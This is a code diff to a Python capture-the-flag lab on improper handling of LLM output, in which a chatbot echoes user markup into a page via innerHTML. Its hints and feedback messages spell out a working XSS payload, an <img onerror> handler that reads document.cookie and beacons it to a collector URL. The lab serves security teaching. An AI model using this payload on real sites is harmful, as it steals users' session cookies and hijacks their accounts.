@@ -1,5 +1,18 @@
-"""LLM05:2025 — Improper Output Handling."""
+"""LLM05:2025 — Improper Output Handling.
 
+The app renders this assistant's output as raw HTML (the vulnerability): the
+frontend drops the reply straight into the DOM via innerHTML. FormatBot echoes
+whatever markup you ask it to, unsanitised.
+
+There is NO flag in the page. What the page *does* hold is a per-session secret
+token in a JS-READABLE cookie (document.cookie) — the kind of in-page secret a
+real XSS steals. Popping an alert proves execution but exfiltrates nothing and
+reveals nothing. To win you must inject a vector that READS that token and
+BEACONS it to the attacker collector at `/api/lab/llm05/collect?token=…`. When
+the server sees the correct token arrive over that channel, the flag is released
+and the page shows it in a green banner. So the reveal is the *result* of a real
+exfiltration, not a string match — and a bare `onerror=alert(1)` no longer works.
+"""
 import re
 
 from config import FLAG_PREFIX
@@ -47,17 +60,19 @@ class OutputHandling(Challenge):
              "(document.cookie) — so if your markup actually runs, it could steal that cookie and "
              "send it to the exfil collector shown below the chat.")
     hints = [
-        "The app drops the model's output straight into the page with innerHTML, unsanitised. Make "
-        "me echo your markup with 'output:' and use a self-firing handler (a <script> added via "
-        "innerHTML won't run) — e.g. <img src=x onerror=...>.",
-        "An alert proves execution but wins nothing — you have to STEAL something. This app stores "
-        "your session token in a JS-readable cookie: open DevTools and look at document.cookie.",
-        "You don't have your own server, so use the exfil collector under the chat (it shows what it "
-        "receives). Send the cookie to it from your handler, e.g. new Image().src = your collector "
-        "URL + document.cookie.",
-        "Full payload: output: <img src=x onerror=\"new Image().src='/api/lab/llm05/collect?c='+"
-        "encodeURIComponent(document.cookie)\">  — the collector logs your stolen cookie, the server "
-        "sees the token, and the flag appears in the green banner.",
+        "This bot echoes your text straight into the page without sanitising it — classic "
+        "improper output handling. Prefix a message with `output:` and watch where it lands. "
+        "First question to answer: can you get the page to treat your input as HTML rather than "
+        "as plain text?",
+        "Plain tags render but don't DO anything, and a raw <script> injected via innerHTML "
+        "won't execute. You need an element that runs JavaScript on its own the moment it's "
+        "inserted — think about HTML attributes that fire automatically when something goes "
+        "wrong loading.",
+        "Executing isn't the goal — stealing is. The session token lives in `document.cookie`, and "
+        "there's a collector under the chat that logs any request it receives. You don't need your own "
+        "server: fire an outbound GET from JS with the cookie as a query param. The classic one-liner "
+        "is `new Image().src='<collector-url>?c='+encodeURIComponent(document.cookie)`. Put that in an "
+        "`onerror` on a broken image, sent via `output:`.",
     ]
     flag = FLAG   # never placed in the DOM; released only after real exfiltration to the collector
     defense = ("Treat all LLM output as untrusted. Context-aware encode/escape before "
@@ -86,20 +101,30 @@ class OutputHandling(Challenge):
                         'up top. 👀</div>')
             elif handler and reads and not sink:
                 note = ('<div class="xss-note">⚡ Executed — and you\'re reading the page\'s secret. But '
-                        'you\'re not sending it anywhere. Reading it isn\'t stealing it; give it somewhere to go.</div>')
+                        'you\'re not sending it anywhere. Fire it out: '
+                        '<code>new Image().src=\'&lt;collector&gt;?c=\'+encodeURIComponent(document.cookie)</code></div>')
             elif handler and sink and not reads:
                 note = ('<div class="xss-note">⚡ Executed — and you\'re making an outbound request. But '
-                        'you\'re not carrying the page\'s secret with it. What are you actually exfiltrating?</div>')
+                        'you\'re not carrying the page\'s secret with it. Append the cookie: '
+                        '<code>...?c=\'+encodeURIComponent(document.cookie)</code></div>')
             elif handler:
                 note = ('<div class="xss-note">⚡ Your handler ran — but popping an alert only proves you can '
-                        'execute. It steals nothing. Your session token sits in document.cookie — read it and '
-                        'send it to the exfil collector shown under the chat.</div>')
+                        'execute. It steals nothing. Read the token and beacon it out, e.g. '
+                        '<code>new Image().src=\'&lt;collector&gt;?c=\'+encodeURIComponent(document.cookie)</code> '
+                        '(collector URL shown under the chat).</div>')
             elif _SCRIPT_TAG.search(payload):
                 note = ('<div class="xss-note">…a &lt;script&gt; dropped in via innerHTML never runs. Reach for '
-                        'an element whose event handler fires on its own when it\'s inserted.</div>')
+                        'an element whose event handler fires on its own when it\'s inserted — e.g. an '
+                        '&lt;img&gt; with a broken src and an <code>onerror</code> that exfiltrates the cookie.</div>')
+            elif "<img" in payload.lower():
+                note = ('<div class="xss-note">…a broken image on its own does nothing. Give it an '
+                        '<code>onerror</code> handler that runs when the load fails, and use it to steal + '
+                        'send the cookie: '
+                        '<code>&lt;img src=x onerror="new Image().src=\'&lt;collector&gt;?c=\'+encodeURIComponent(document.cookie)"&gt;</code></div>')
             else:
-                note = ('<div class="xss-note">…rendered as raw HTML — but nothing executed. Inert tags just sit '
-                        'there. You need something that runs by itself.</div>')
+                note = ('<div class="xss-note">…rendered as raw HTML — but nothing executed. You need an element '
+                        'that runs JS by itself (e.g. <code>&lt;img src=x onerror=...&gt;</code>) and uses it to '
+                        'exfiltrate the session cookie to the collector.</div>')
             return payload + note
 
         # ---- No markup: behave like a chatbot and steer, without giving the answer away.
